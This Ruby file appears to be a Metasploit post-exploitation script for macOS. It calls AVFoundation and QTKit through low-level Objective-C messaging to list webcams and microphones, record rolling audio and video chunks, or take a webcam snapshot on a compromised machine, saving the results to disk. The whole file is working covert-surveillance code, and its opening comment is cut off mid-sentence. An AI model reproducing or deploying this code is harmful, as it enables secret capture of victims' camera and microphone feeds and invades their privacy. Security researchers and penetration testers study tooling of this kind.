#
# @author joev
# This script pulls a 
# It will not work without the right prefixes, see lib/msf/core/post/osx/ruby_dl.rb
#

# make sure the fs is set up as expected
require 'fileutils'
FileUtils.mkdir_p File.dirname(options[:record_file])
FileUtils.mkdir_p File.dirname(options[:snap_file])
File.delete(options[:record_file]) if File.exists?(options[:record_file])
File.delete(options[:snap_file]) if File.exists?(options[:snap_file])

#
# Constants
#

# NSTIFFFileType  0 
# NSBMPFileType   1
# NSGIFFileType   2
# NSJPEGFileType  3
# NSPNGFileType   4 
SNAP_FILETYPES = %w(tiff bmp gif jpg png)
VID_TYPE = 'vide'
MUX_TYPE = 'muxx'
AUD_TYPE = 'soun'
POSITIONS = {
  '1' => 'BACK-FACING',
  '2' => 'FRONT-FACING'
}
PRESETS = [
  'AVCaptureSessionPresetLow',
  'AVCaptureSessionPresetMedium',
  'AVCaptureSessionPresetHigh',
  'AVCaptureSessionPreset320x240',
  'AVCaptureSessionPreset352x288',
  'AVCaptureSessionPreset640x480',
  'AVCaptureSessionPreset960x540',
  'AVCaptureSessionPreset1280x720'
]

# time to wait until we see a movie is being recorded and persisted
TIMEOUT = 30

#
# Helper methods for objc message passing
#

if not ruby_1_9_or_higher?
  # ruby < 1.9 freaks when you send int -> void* or float -> void*
  #  so we have to reload the lib into separate modules with different
  #  exported typedefs, and patch objc_call to do our own typechecking.
  # this can probably be done better.
  module LibCWithInt
    extend Importer
    dlload 'libSystem.B.dylib'
    extern 'void *sel_getUid(void*)'
    extern 'void *objc_msgSend(void *, void *, int, int)'
  end
  module LibCWithFloat
    extend Importer
    dlload 'libSystem.B.dylib'
    extern 'void *sel_getUid(void*)'
    extern 'void *objc_msgSend(void *, void *, double, double)'
  end
  module LibCWithVoidPtrInt
    extend Importer
    dlload 'libSystem.B.dylib'
    extern 'void *sel_getUid(void*)'
    extern 'void *objc_msgSend(void *, void *, void*, int)'
  end
  module LibCWithIntVoidPtr
    extend Importer
    dlload 'libSystem.B.dylib'
    extern 'void *sel_getUid(void*)'
    extern 'void *objc_msgSend(void *, void *, int, void*)'
  end  
end

def objc_call(instance, method, arg=nil, arg2=nil, arg3=nil)
  # ruby < 1.9 freaks when you send int -> void* or float -> void*
  # so we have to reload the lib into a separate with different exported typedefs,
  #  and call
  if not ruby_1_9_or_higher? and arg.kind_of?(Integer)
    if not arg2.kind_of?(Integer) and not arg2.nil?
      LibCWithIntVoidPtr.objc_msgSend(instance, LibCWithIntVoidPtr.sel_getUid(method), arg||0, arg2)
    else
      LibCWithInt.objc_msgSend(instance, LibCWithInt.sel_getUid(method), arg||0, arg2||0)
    end
  elsif not ruby_1_9_or_higher? and arg2.kind_of?(Integer)
    LibCWithVoidPtrInt.objc_msgSend(instance, LibCWithVoidPtrInt.sel_getUid(method), arg||0, arg2)
  elsif not ruby_1_9_or_higher? and arg.kind_of?(Float)
    LibCWithFloat.objc_msgSend(instance, LibCWithFloat.sel_getUid(method), arg||0.0, arg2||0.0)
  else
    AVFoundation.objc_msgSend(instance, AVFoundation.sel_getUid(method), arg, arg2)
  end
end

def objc_call_class(klass, method, arg=nil, arg2=nil)
  objc_call(AVFoundation.objc_getClass(klass), AVFoundation.sel_getUid(method), arg, arg2)
end

def nsstring(str)
  objc_call(objc_call(objc_call_class(
    'NSString', 'alloc'),
    'initWithCString:', str), 
    'autorelease')
end

#
# External dynamically linked code
#
module AVFoundation
  extend Importer
  dlload 'AVFoundation.framework/AVFoundation'
  extern 'void *objc_msgSend(void *, void *, void *, void*)'
  extern 'void *sel_getUid(void*)'
  extern 'void *objc_getClass(void *)'
end

module CoreMedia
  extend Importer
  dlload 'CoreMedia.framework/CoreMedia'
  extern 'void *CMTimeMake(float, int)'
  extern 'void *CMTimeMakeWithSeconds(float,short)'
end

module QTKit
  extend Importer
  dlload 'QTKit.framework/QTKit'
end

#
# Actual Webcam code
#
snap_filetype_index = SNAP_FILETYPES.index(options[:snap_filetype].to_s)

# Create a pool to catch autoreleased stuff
autorelease_pool = objc_call_class('NSAutoreleasePool', 'new')

vid_type = nsstring(VID_TYPE)
mux_type = nsstring(MUX_TYPE)
aud_type = nsstring(AUD_TYPE)

# Detect what devices are available and their status
devices_ref = objc_call_class('AVCaptureDevice', 'devices')
device_count = objc_call(devices_ref, 'count').to_i
if device_count.zero? and not options[:actions] =~ /list/i
  raise "Invalid device. Check devices with `set ACTION LIST`. Exiting."
  exit
end

device_enum = objc_call(devices_ref, 'objectEnumerator')
devices = (0...device_count).
  map { objc_call(device_enum, 'nextObject') }.
  select do |device|
    vid = objc_call(device, 'hasMediaType:', vid_type).to_i > 0
    mux = objc_call(device, 'hasMediaType:', mux_type).to_i > 0
    vid or mux
  end

device_enum = objc_call(devices_ref, 'objectEnumerator')
audio_devices = (0...device_count).
  map { objc_call(device_enum, 'nextObject') }.
  select { |d| objc_call(d, 'hasMediaType:', aud_type).to_i > 0 }

# Returns an array of names
def device_names(devices)
  devices.
    map { |device| objc_call(device, 'localizedName') }.
    map { |name| objc_call(name, 'UTF8String') }.
    map(&:to_s)
end

# Returns an array of "AVAIL" or "BUSY"
def device_stati(devices)
  devices.
    map { |d| objc_call(d, 'isInUseByAnotherApplication').to_i > 0 }.
    map { |b| if b then 'BUSY' else 'AVAIL' end }
end

# Returns an array of "FRONT-FACING", "BACK-FACING", or nil
def device_positions(devices)
  devices.map { |d| POSITIONS[objc_call(d, 'position').to_i.to_s] }
end

# Returns an array of "DEFAULT" or nil
def device_defaults(devices, default_device)
  default_name = objc_call(default_device, 'localizedName')
  devices.map { |d| 'DEFAULT' if objc_call(d, 'localizedName') == default_name }
end

# Snowballs all the device_* methods into a proper 2d array
def device_info(devices, default_device)
  device_names(devices).zip(
    device_stati(devices), device_positions(devices), device_defaults(devices, default_device)
  )
end

# Prints the data from device_info
def print_devices(devices, default_device)
  device_info(devices, default_device).each_with_index do |d, i|
    line = "#{i}.  #{d[0]} [#{d[1]}]"
    line << " [#{d[2]}]" unless d[2].nil?
    line << " [#{d[3]}]" unless d[3].nil?
    puts line
  end
end

# Returns the default device for audio or video type
def default_device_for_media(media)
  objc_call_class('AVCaptureDevice', 'defaultDeviceWithMediaType:', media)
end

# Returns an array of available "Presets" (Medium/High/etc)
def available_presets(media)
  supported_presets = []
  cap_session = objc_call_class('AVCaptureSession', 'new')
  device = default_device_for_media(media)
  device_input = objc_call_class('AVCaptureDeviceInput', 'deviceInputWithDevice:error:', device, nil)
  objc_call(cap_session, 'addInput:', device_input)
  avail_presets = PRESETS.select do |preset|
    objc_call(cap_session, 'canSetSessionPreset:', nsstring(preset)).to_i > 0
  end
  # clean up
  objc_call(cap_session, 'removeInput:', device_input)
  objc_call(cap_session, 'release')
  cap_session = nil
  avail_presets
end

def use_audio?(options)
  options[:audio_enabled] and options[:action].to_s == 'record'
end

def use_video?(options)
  (options[:video_enabled] and options[:action].to_s == 'record') or options[:action].to_s == 'snapshot'
end

if options[:action].to_s == 'list' # print list and die  
  if options[:video_enabled]
    puts "===============\nVideo Devices:\n===============\n"
    print_devices(devices, default_device_for_media(vid_type))
    puts "\nAvailable video compression presets:\n\n"
    puts available_presets(vid_type).join("\n")
  end
  puts "\n===============\nAudio Devices:\n===============\n"
  print_devices(audio_devices, default_device_for_media(aud_type))
  puts "\nAvailable audio compression presets:\n\n"
  presets = available_presets(aud_type)
  # don't expose the resolution-based presets
  puts presets.reject { |c| c =~ /\d+x\d+/ }.join("\n")
  exit
end

# At this point we will either record or snapshot.

# Create a session to add I/O to
session = objc_call_class('AVCaptureSession', 'new')

# open the AV devices
if use_video?(options)
  video_device = devices[options[:video_device]]
  if video_device.nil?
    raise 'Failed to open video device'
  end
  input = objc_call_class('AVCaptureDeviceInput', 'deviceInputWithDevice:error:', video_device, 0)
  if not objc_call(session, 'canAddInput:', input).to_i > 0
    raise 'Failed to add video input device'
  end
  objc_call(session, 'addInput:', input)
end

if use_audio?(options)
  # open the audio device
  audio_device = audio_devices[options[:audio_device]]
  if audio_device.nil?
    raise 'Failed to open audio device'
  end
  input = objc_call_class('AVCaptureDeviceInput', 'deviceInputWithDevice:error:', audio_device, 0)
  if not objc_call(session, 'canAddInput:', input).to_i > 0
    raise 'Failed to add video input device'
  end
  objc_call(session, 'addInput:', input)
end

# initialize file output
record_file = options[:record_file]
output = objc_call_class('AVCaptureMovieFileOutput', 'new')

if not objc_call(session, 'canAddOutput:', output).to_i > 0
  raise 'Failed to add file output to stream'
end

objc_call(session, 'setPreset:', preset)
objc_call(session, 'addOutput:', output)

objc_call(session, 'startRunning')
record_file_nsstr = nsstring(record_file)
file_url = objc_call_class('NSURL', 'fileURLWithPath:', record_file_nsstr)
objc_call(output, 'startRecordingToOutputFileURL:recordingDelegate:', file_url, objc_call_class('NSObject', 'new'))

# hang until we see something written to disk (with a TIMEOUT)
started_time = Time.now
while objc_call(output, 'recordedFileSize').to_i < 1
  raise "Timed out waiting on recording to start." if Time.now - started_time > TIMEOUT
end

if options[:action] == 'record' # record in a loop for options[:record_len] seconds
  curr_chunk = 0
  last_roll = Time.now
  # wait until at least one frame has been captured
  while curr_chunk < options[:num_chunks]
    time = objc_call(objc_call_class('NSDate', 'new'), 'autorelease')

    if Time.now - last_roll > options[:chunk_len].to_i # roll that movie file
      base = File.basename(record_file, '.*') # returns it with no extension
      num = ((base.match(/\\d+$/)||['0'])[0].to_i+1).to_s
      ext = File.extname(record_file) || 'o'
      record_file = File.join(File.dirname(record_file), base+num+'.'+ext)

      # redirect buffer output to new file path
      file_url = objc_call_class('NSURL', 'fileURLWithPath:', nsstring(record_file))
      objc_call(output, 'stopRecording')
      objc_call(output, 'startRecordingToOutputFileURL:recordingDelegate:', file_url, objc_call_class('NSObject', 'new'))
      # remember we hit a chunk
      last_roll = Time.now
      curr_chunk += 1
    end
  end
end

# stop recording and stop session
objc_call(output, 'stopRecording')
objc_call(session, 'stopRunning')

if options[:action] == 'snapshot' # user wants a snapshot, just grab the first frame of the .mov
  # note: this could be better, but i need to figure out how to implement objc blocks (or callbacks) in rb.
  # then I could query the (asynchronous) AVCaptureStillImageOutput API to get full-size image.
  # one way to do this is to create rwx memory and dump our code into, but this is suboptimal.
  # instead read captured movie file into QTKit (which is deprecated in 10.9, but at least stable for now).
  dict = objc_call_class('NSMutableDictionary', 'dictionary')
  objc_call(dict, 'setObject:forKey:', nsstring('NSImage'), nsstring('QTMovieFrameImageType'))
  # grab a frame image from the move
  m = objc_call_class('QTMovie', 'movieWithFile:error:', record_file_nsstr, nil)
  img = objc_call(m, 'currentFrameImage')
  # set compression options
  opts = objc_call_class('NSDictionary', 'dictionaryWithObject:forKey:',
    objc_call_class('NSNumber', 'numberWithFloat:', options[:snap_jpg_compression]),
    nsstring('NSImageCompressionFactor')
  )
  # convert to desired format
  bitmap = objc_call(objc_call(img, 'representations'), 'objectAtIndex:', 0)
  data = objc_call(bitmap, 'representationUsingType:properties:', snap_filetype_index, opts)
  objc_call(data, 'writeToFile:atomically:', nsstring(options[:snap_file]), 0)

  # # delete the original movie file
  File.delete(record_file)
end

# shows over kids
objc_call(autorelease_pool, 'drain')
